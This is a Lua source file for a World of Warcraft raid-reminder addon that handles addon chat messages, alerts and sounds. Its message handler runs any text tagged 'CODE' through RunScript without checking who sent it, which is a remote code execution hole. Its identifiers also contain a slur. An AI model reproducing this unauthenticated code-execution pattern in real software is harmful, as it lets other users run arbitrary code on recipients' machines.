
local _, Reminders = ...;

_G["RemindersLite"] = Reminders;

local addon = "RemindersLite";
local addonPrefix = "MTHDRMDRS_PR"
-- bit of a hack, but was easy to code (and who's gonna use that.. oh wait)
local sep = "ř"
local numel = table.getn;
local VERSION = "1.1.0"

SLASH_METHODRETARDMANAGERLITE1 = "/rm";

function SlashCmdList.METHODRETARDMANAGERLITE(cmd, editbox)
	if cmd == "unlock" and Reminders.gui then
		Reminders.gui:UnlockMove()
	elseif cmd == "lock" and Reminders.gui then
		Reminders.gui:LockMove()
	end
end

local loaded = {}

local AceSerializer, AceComm

do
	local event_frame = CreateFrame("frame", "RetardManagerFrame", UIParent);
	Reminders.event_frame = event_frame;


	activeEncounterReminders = Reminders.activeEncounterReminders
	
	event_frame:RegisterEvent("ADDON_LOADED");
	event_frame:RegisterEvent("PLAYER_LOGIN");
	event_frame:RegisterEvent("PLAYER_LOGOUT");
	event_frame:RegisterEvent("CHAT_MSG_ADDON");
	
	event_frame:SetScript("OnEvent", function(self, ...)
		local event, loaded = ...;
		if event == "ADDON_LOADED" then
			if addon == loaded then
				Reminders:OnLoad();
			end
		else
			-- do some on event handling here
			Reminders:OnEvent(...);
		end
	end)
	
	-- Show Frame
	event_frame:Hide();
end


local function split(msg, sep)
	local ar = {}
	local index = 1
	for v in string.gmatch(msg, "([^"..sep.."]+)") do
		ar[index] = v
		index = index + 1
	end
	return ar
end

local function SendAddonMessageWrap(prefix, text, distribution, target, prio, callbackFn, callbackArg)
	--print("Sending message length", string.len(text))
	AceComm:SendCommMessage(prefix, text, distribution, target, prio, callbackFn, callbackArg)
end

function Reminders:InitDB()
	local t = {};
	return t;
end

function Reminders:OnLoad()
	self.event_frame:UnregisterEvent("ADDON_LOADED");
	-- maybe full version is present
	if Reminders.gui and Reminders.gui.frame then
		return
	end
	self.loaded = loaded
	RemindersLiteDB = RemindersLiteDB or self:InitDB();
	Reminders.db = RemindersLiteDB

	-- load shared media
	LoadAddOn("LibSharedMedia-3.0");
	AceComm = AceComm or LibStub:GetLibrary("AceComm-3.0")

	-- if gui exists
	if Reminders.gui then
		Reminders.gui:InitializeGUI(Reminders)
	end

	local success = AceComm:RegisterComm(addonPrefix, function(prefix, message, distribution, sender) self:OnMessageReceived(message, distribution, sender) end) --RegisterAddonMessagePrefix(addonPrefix)
	if not success then
		--print("REMINDERS ERROR - FAILED TO REGISTER MESSAGE PREFIX")
	end

end

function Reminders:Purge()
	RemindersLiteDB = self:InitDB();
end

function Reminders:OnEvent(...)
	if not self.loaded then
		return
	end
	local game_event, timestamp, event = ...;
	-- check on login too btw
	if game_event == "CHAT_MSG_ADDON" then
		local _, prefix, msg, channel, source = ...;
		if prefix == addonPrefix then
			-- handled by acecomm
			-- self:OnMessageReceived(msg, channel, source)
		end
	end
end

function Reminders:ReminderToString(reminder)
	return reminder.category .. "_" .. reminder.name
end

function Reminders:FireModuleEvent(event)
	print("Module event was fired: " .. event)
end

function Reminders:OnMessageReceived(msg, channel, source)
	--print(string.len(msg))
	local spl = split(msg, sep)
	if not spl or not spl[1] then
		print("Wrong message format")
		return
	end
	local sig = spl[1]
	if sig == "ALERT" then
		local reminder = {
			notification = {
				duration = tonumber(spl[4]),
				sound = spl[3],
				message = spl[2]
			}
		}
		self:ReceiveAlert(reminder)
	elseif sig == "REMINDER" then
		local serialized = string.sub(msg, string.len("REMINDER") + string.len(sep) + 1)
		self:ReceiveReminder(serialized)
	elseif sig == "VERSCHECK" then
		local vers = "VERSCHECKRET" .. sep .. VERSION
		SendAddonMessageWrap(addonPrefix, vers, "WHISPER", source)
	elseif sig == "CODE" then
		local code = spl[2]
		self:ExecuteCode(code)
	else
		print("Wrong message format")
	end

end

function Reminders:ExecuteCode(code)
	local runnable = "local function dummy_func_name_() " .. code .. "; end; dummy_func_name_()"
	RunScript(runnable)
end

function Reminders:ReceiveAlert(reminder)
	if Reminders.gui then
		Reminders.gui:ShowReminder(reminder)
	else
		print("Received reminder with message", reminder.notification.message, "but no gui is loaded.")
	end
end


function Reminders:SoundIndexToName(index)
    local SML = SML or LibStub:GetLibrary("LibSharedMedia-3.0")
    local sound_name = SML:List(SML.MediaType.SOUND)[index]
    if not sound_name then return "None" end
    return sound_name
end

function Reminders:SoundNameToIndex(name)
    local SML = SML or LibStub:GetLibrary("LibSharedMedia-3.0")
    for k, v in pairs(SML:List(SML.MediaType.SOUND)) do
        if v == name then
            return k
        end
    end
    print("Sound index not found.")
    return 0
end

function Reminders:PlaySound(name)
	local SML = SML or LibStub:GetLibrary("LibSharedMedia-3.0")
	local fetch = SML:Fetch(SML.MediaType.SOUND, name, true)
	if fetch then
		PlaySoundFile(fetch, "MASTER")
		return
	elseif WeakAuras and WeakAuras.sound_types then
		for k, v in pairs(WeakAuras.sound_types) do
			if v == name then
				PlaySoundFile(k, "MASTER")
				return
			end
		end
	end
	print("Warning - Sound '" .. name .. "' not found.")
end